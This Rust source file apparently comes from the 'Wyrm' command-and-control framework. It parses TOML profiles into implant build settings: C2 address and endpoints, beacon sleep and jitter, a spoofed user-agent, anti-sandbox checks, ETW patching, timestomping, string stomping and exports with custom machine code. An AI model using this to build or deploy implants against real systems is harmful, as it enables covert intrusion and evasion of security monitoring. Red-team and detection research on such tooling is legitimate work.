use std::{
    collections::{BTreeMap, HashSet},
    path::Path,
};

use serde::Deserialize;
use shared::tasks::{Exports, NewAgentStaging, StageType, StringStomp, WyrmResult};
use tokio::io;

#[derive(Deserialize, Debug, Default, Clone)]
pub struct Profile {
    pub server: Server,
    pub implants: BTreeMap<String, Implant>,
}

#[derive(Deserialize, Debug, Default, Clone)]
pub struct Server {
    pub token: String,
}

#[derive(Deserialize, Debug, Default, Clone)]
pub struct Network {
    pub address: String,
    pub uri: Vec<String>,
    pub port: u16,
    pub token: Option<String>,
    pub sleep: Option<u64>,
    pub useragent: Option<String>,
    pub jitter: Option<u64>,
}

#[derive(Deserialize, Debug, Default, Clone)]
pub struct Implant {
    pub anti_sandbox: Option<AntiSandbox>,
    pub debug: Option<bool>,
    svc_name: String,
    pub network: Network,
    pub evasion: Evasion,
    pub exports: Exports,
    pub string_stomp: Option<StringStomp>,
}

#[derive(Deserialize, Debug, Default, Clone)]
pub struct AntiSandbox {
    pub trig: Option<bool>,
    pub ram: Option<bool>,
}

#[derive(Deserialize, Debug, Default, Clone)]
pub struct Evasion {
    pub patch_etw: Option<bool>,
    pub timestomp: Option<String>,
}

impl Profile {
    /// Constructs a [`shared::tasks::NewAgentStaging`] from the profile.
    ///
    /// # Args
    /// - `listener_profile_name`: The name in the profile for which listener is selected
    /// - `implant_profile_name`: The name in the profile for which implant profile is selected
    /// - `stage_type`: The [`shared::tasks::StageType`] of binary to build
    pub fn as_staged_agent(
        &self,
        implant_profile_name: &str,
        stage_type: StageType,
    ) -> WyrmResult<NewAgentStaging> {
        //
        // Essentially here we are going to validate the input; and reconstruct the data assuming it is correct.
        // In the event of an error, we want to return a WyrmResult::Err to indicate there was some form of failure.
        //

        let implant = match self.implants.get(implant_profile_name) {
            Some(i) => i,
            None => {
                return WyrmResult::Err(format!(
                    "Could not find implant profile {implant_profile_name}"
                ));
            }
        };

        let build_debug = implant.debug.unwrap_or_default();
        let patch_etw = implant.evasion.patch_etw.unwrap_or_default();

        // Unwrap a sleep time from either profile specific, a higher order key, or if none found, use
        // a default of 1 hr (3600 seconds).
        let sleep_time = match implant.network.sleep {
            Some(s) => s,
            None => 3600,
        };

        // Try cast to i64 from u64, checking the number stays the same
        let default_sleep_time = sleep_time as i64;
        if default_sleep_time as u64 != sleep_time {
            return WyrmResult::Err(format!(
                "Integer overflow occurred when casting from u64 to i64. Cannot proceed. \
            got value {sleep_time}"
            ));
        }

        let pe_name = format!("{}", implant_profile_name);

        let antisandbox_trig = if let Some(anti) = &implant.anti_sandbox {
            anti.trig.unwrap_or_default()
        } else {
            false
        };

        let antisandbox_ram = if let Some(anti) = &implant.anti_sandbox {
            anti.ram.unwrap_or_default()
        } else {
            false
        };

        let agent_security_token = if let Some(token) = &implant.network.token {
            token.clone()
        } else {
            self.server.token.clone()
        };

        let useragent = if let Some(ua) = &implant.network.useragent {
            ua.clone()
        } else {
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36".into()
        };

        // Validate we have at least 1 URI endpoint before insertion, otherwise error
        if implant.network.uri.is_empty() {
            return WyrmResult::Err(String::from("At least 1 URI is required for the server."));
        }

        let string_stomp = StringStomp::from(&implant.string_stomp);

        WyrmResult::Ok(NewAgentStaging {
            // TODO not required
            implant_name: String::new(),
            default_sleep_time,
            c2_address: implant.network.address.clone(),
            c2_endpoints: implant.network.uri.clone(),
            // TODO not required
            staging_endpoint: String::new(),
            pe_name,
            port: implant.network.port,
            agent_security_token,
            antisandbox_trig,
            antisandbox_ram,
            stage_type,
            build_debug,
            useragent,
            patch_etw,
            jitter: implant.network.jitter,
            timestomp: implant.evasion.timestomp.clone(),
            exports: implant.exports.clone(),
            svc_name: implant.svc_name.clone(),
            string_stomp,
        })
    }
}

/// Parse profiles from within the /profiles/* directory relative to the c2
/// crate to load configurable user profiles at runtime.
pub async fn parse_profile() -> io::Result<Profile> {
    let path = Path::new("./profiles");
    let mut profile_paths: Vec<String> = Vec::new();

    if path.is_dir() {
        let mut read_dir = tokio::fs::read_dir(&path).await?;
        while let Some(entry) = read_dir.next_entry().await? {
            if entry.file_type().await.is_ok_and(|f| f.is_file()) {
                if entry
                    .file_name()
                    .to_str()
                    .is_some_and(|f| f.ends_with(".toml"))
                {
                    if let Ok(filename) = entry.file_name().into_string() {
                        profile_paths.push(filename);
                    };
                }
            }
        }
    } else {
        return Err(io::Error::other("Could not open dir profiles."));
    }

    //
    // We now only support 1 profile toml in the profile directory. If more than one is detected,
    // then return an error, logging the error internally.
    //
    if profile_paths.len() != 1 {
        let msg = "You must have only have one `profile.toml` in /c2/profiles. Please consolidate \
            into one profile. You may specify multiple implant configurations to build, but you must \
            have one, and only one, `profile.toml`.";
        return Err(io::Error::other(msg));
    }

    //
    // Now we have the profile - parse it and return it out
    //
    let p_path = std::mem::take(&mut profile_paths[0]);
    let temp_path = path.join(&p_path);

    let profile = match read_profile(&temp_path).await {
        Ok(p) => p,
        Err(e) => {
            let msg = format!("Could not parse profile. {e:?}");
            return Err(io::Error::other(msg));
        }
    };

    Ok(profile)
}

pub fn add_listeners_from_profiles(existing: &mut HashSet<String>, p: &Profile) {
    for (_, implant) in p.implants.iter() {
        for uri in &implant.network.uri {
            // Strip out the leading /
            if uri.starts_with('/') {
                let mut tmp = uri.clone();
                tmp.remove(0);
                existing.insert(tmp);
            } else {
                existing.insert(uri.clone());
            }
        }
    }
}

pub fn add_tokens_from_profiles(existing: &mut HashSet<String>, p: &Profile) {
    // Add the default required token in the [server] attribute
    existing.insert(p.server.token.clone());

    for i in p.implants.values() {
        if let Some(tok) = &i.network.token {
            existing.insert(tok.clone());
        }
    }
}

async fn read_profile(path: &Path) -> io::Result<Profile> {
    let file_content = match tokio::fs::read(&path).await {
        Ok(f) => f,
        Err(e) => {
            return Err(e);
        }
    };

    if file_content.is_empty() {
        return Err(io::Error::other("File content was empty."));
    }

    let profile = match toml::from_slice::<Profile>(&file_content) {
        Ok(p) => p,
        Err(e) => {
            return Err(io::Error::other(format!(
                "Could not deserialise data for profile: {path:?}. {e:?}"
            )));
        }
    };

    Ok(profile)
}

#[derive(Debug)]
pub struct ParsedExportStrings {
    pub export_only_jmp_wyrm: String,
    pub export_machine_code: String,
}

impl ParsedExportStrings {
    fn empty() -> Self {
        Self {
            export_only_jmp_wyrm: String::new(),
            export_machine_code: String::new(),
        }
    }

    fn from(plain_only: String, machine_code: String) -> Self {
        Self {
            export_only_jmp_wyrm: plain_only,
            export_machine_code: machine_code,
        }
    }
}

/// Parses a Vec of [`shared::tasks::Export`] correctly formatted to be directly inserted into the
/// cargo build process for an implant. If the input is `None`, it will return an empty string.
pub fn parse_exports_to_string_for_env(exports: &Exports) -> ParsedExportStrings {
    let exports = match exports {
        Some(e) => e,
        None => return ParsedExportStrings::empty(),
    };

    // For building with junk / user defined machine code
    let mut builder_with_machine_code = String::new();
    // For building just the Export -> call start_wyrm;
    let mut builder_plain = String::new();

    for e in exports {
        if let Some(machine_code) = &e.1.machine_code {
            // If we have machine code present
            builder_with_machine_code.push_str(format!("{}=", e.0).as_str());
            for m in machine_code {
                builder_with_machine_code.push_str(format!("0x{:X},", m).as_str());
            }
            // remove the trailing ','
            builder_with_machine_code.remove(builder_with_machine_code.len() - 1);
            builder_with_machine_code.push_str(";");
        } else {
            builder_plain.push_str(format!("{};", e.0,).as_str());
        }
    }

    ParsedExportStrings::from(builder_plain, builder_with_machine_code)
}
